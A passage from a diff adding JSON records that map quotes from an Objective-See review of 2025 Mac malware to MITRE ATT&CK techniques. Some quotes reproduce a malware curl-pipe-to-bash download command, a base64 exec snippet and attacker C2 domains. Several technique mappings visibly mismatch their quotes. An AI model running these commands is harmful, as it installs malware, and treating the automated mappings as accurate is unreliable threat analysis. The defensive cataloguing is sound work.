+        "name": "Exploit Public-Facing Application",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1190"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“The threat actors only send a malicious payload to validated targets, likely based on IP address, geolocation, time and HTTP request headers.\" - PANW Unit 42 As Unit 42 notes, targeting victims directly via LinkedIn, rather than relying on mass phishing, gives the group greater…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566.003",
+        "name": "Phishing: Spearphishing via Service",
+        "parent_id": "T1566",
+        "url": "https://attack.mitre.org/techniques/T1566/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“- Persistence Mechanism: How it installed itself to ensure it would be automatically restarted on reboot or user login.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1053.005",
+        "name": "Scheduled Task/Job: Scheduled Task",
+        "parent_id": "T1053",
+        "url": "https://attack.mitre.org/techniques/T1053/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“- Root Troy V4 (`remoted`): fully featured backdoor, written in Go, and used to download the other payloads as well as run them.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“It is also worth noting that, since NightPaw supports remote execution of arbitrary commands, it could be tasked with persisting itself post infection.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“NightPaw also includes a straightforward remote shell capability that allows attackers to execute arbitrary commands on infected systems.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“- Arbitrary Python execution (ret=2): srcData = base64.b64decode(res[\"content\"]) exec(srcData)” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.006",
+        "name": "Command and Scripting Interpreter: Python",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/006"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“As the Jamf report notes—and as we will see shortly—the TXT record contains a JXA agent that repeatedly polls the attacker’s command-and-control server (goldenticketsshop.com) for new AppleScript or JavaScript payloads to execute.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/007"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Instead, independent “traffer teams” focus on spreading the malware at scale, using techniques such as fake software updates, malvertising, or “ClickFix” scams.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.001",
+        "name": "User Execution: Malicious Link",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Palo Alto's Prashil Pattni looks into a Slow Pisces (aka Jade Sleet, TraderTraitor, PUKCHONG) campaign targeting cryptocurrency developers on LinkedIn, posing as potential employers and sending malware disguised as coding challenges. https://t.co/gAuweiWhrF…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.002",
+        "name": "User Execution: Malicious File",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“Let’s now dive into the new macOS stealers observed in 2025.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1569.002",
+        "name": "System Services: Service Execution",
+        "parent_id": "T1569",
+        "url": "https://attack.mitre.org/techniques/T1569/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“This design allows the attacker to dynamically alter behavior simply by updating the DNS record, without modifying anything on disk.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1112",
+        "name": "Modify Registry",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1112"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“The post breaks down the full infection chain, detection opportunities and why IDE extensions have become a reliable point of initial access.… pic.twitter.com/hYwhwl8rhr — Phorion (@PhorionTech) November 27, 2025 Infection Vector: Backdoored Cursor extension In their blog…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        }
+      ],
+      "technique": {
+        "id": "T1176.002",
+        "name": "Software Extensions: IDE Extensions",
+        "parent_id": "T1176",
+        "url": "https://attack.mitre.org/techniques/T1176/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Instead, the fake version is distributed via the domain https[:]//dynamiclake[.]org.\" -Jamf Once the disk image is mounted, it presents instructions directing the user to launch the application via Terminal, thereby sidestepping Gatekeeper protections: Though the stealer…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1543.001",
+        "name": "Create or Modify System Process: Launch Agent",
+        "parent_id": "T1543",
+        "url": "https://attack.mitre.org/techniques/T1543/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“In this case, the Koi Stealer sample masqueraded as a Visual Studio update, prompting the user to install it and grant Administrator access.\" - Unit 42 They go on to note that, more specifically, the malware’s installation logic was embedded in subverted Visual Studio projects…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1543.003",
+        "name": "Create or Modify System Process: Windows Service",
+        "parent_id": "T1543",
+        "url": "https://attack.mitre.org/techniques/T1543/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Persistence: Launch Daemon A single component, Telegram 2, persists as a Launch Daemon: /Library/LaunchDaemons/com.telegram2.update.agent.plist: Label com.telegram2.update.agent EnvironmentVariables SERVER_AUTH_KEY [REDACTED] CLIENT_AUTH_KEY ... Program /Library/Application…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1543.004",
+        "name": "Create or Modify System Process: Launch Daemon",
+        "parent_id": "T1543",
+        "url": "https://attack.mitre.org/techniques/T1543/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“- ModuleBackconnectShell (Type 0): Establishes an interactive reverse shell by connecting to a C2 endpoint, spawning a pseudo terminal, and relaying input and output over the network.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1546.004",
+        "name": "Event Triggered Execution: Unix Shell Configuration Modification",
+        "parent_id": "T1546",
+        "url": "https://attack.mitre.org/techniques/T1546/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“- Suspicious Package A tool for inspecting macOS installer packages (.pkg files), which also allows files to be easily extracted from the package.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1546.016",
+        "name": "Event Triggered Execution: Installer Packages",
+        "parent_id": "T1546",
+        "url": "https://attack.mitre.org/techniques/T1546/016"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Huntress theorized it could be used for process injection at a later time.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1055",
+        "name": "Process Injection",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1055"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“However, Unit 42 notes that the loader can execute arbitrary payloads.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1055.002",
+        "name": "Process Injection: Portable Executable Injection",
+        "parent_id": "T1055",
+        "url": "https://attack.mitre.org/techniques/T1055/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Many stealers do not persist, and Frigid is no exception.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1548.002",
+        "name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+        "parent_id": "T1548",
+        "url": "https://attack.mitre.org/techniques/T1548/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“The next payload downloaded by the installer script is, as Jamf describes it, a “more heavily obfuscated JXA payload,” which we briefly examine next.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1027"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“Researchers Christopher Lopez and Nick Zolotko initially uncovered Kitty Stealer on VirusTotal.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.002",
+        "name": "Obfuscated Files or Information: Software Packing",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "low",
+      "description": "“It performs two primary actions: \"...the first, it takes another binary and a password as arguments and will decrypt embedded payloads.” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.009",
+        "name": "Obfuscated Files or Information: Embedded Payloads",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/009"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“It is a simple script that runs the following commands: cat /Volumes/Install\\ DynamicLake/Drag\\ into\\ Terminal.msi curl -fsSL https://67e5143a9ca7d2240c137ef80f2641d6.pages.dev/c9c114433040497328fe9212012b1b94.aspx | bash As noted by Jamf, this downloads an obfuscated,…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.010",
+        "name": "Obfuscated Files or Information: Command Obfuscation",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/010"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“Capabilities: Loader + Stealer In this campaign, the attackers deployed two main components: a loader (RN Loader) and a stealer (RN Stealer).” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.013",
+        "name": "Obfuscated Files or Information: Encrypted/Encoded File",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/013"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "high",
+      "description": "“Our analysis includes a comparison of this new variant with its Windows equivalent: https://t.co/bUZSsZCol7 pic.twitter.com/HwSEdu7FVu — Unit 42 (@Unit42_Intel) March 24, 2025 You can also watch a presentation about this malware, presented at #OBTS, on YouTube: Infection…” — Objective-See",
+      "provenance": {
+        "article_source": "Objective-See",
+        "article_url": "https://objective-see.org/blog/blog_0x84.html",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1036",
+        "name": "Masquerading",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1036"
+      }
+    },
+    {
+      "attack_ref": "INC-0334",
+      "confidence": "medium",
+      "description": "“- “Potential Stealer: Purrglar in Progress” -Christopher Lopez/Nick Zolotko Infection Vector: Unknown As the malware was discovered on VirusTotal (and appeared to still be under development at the time), its infection vector is not known.” — Objective-See",
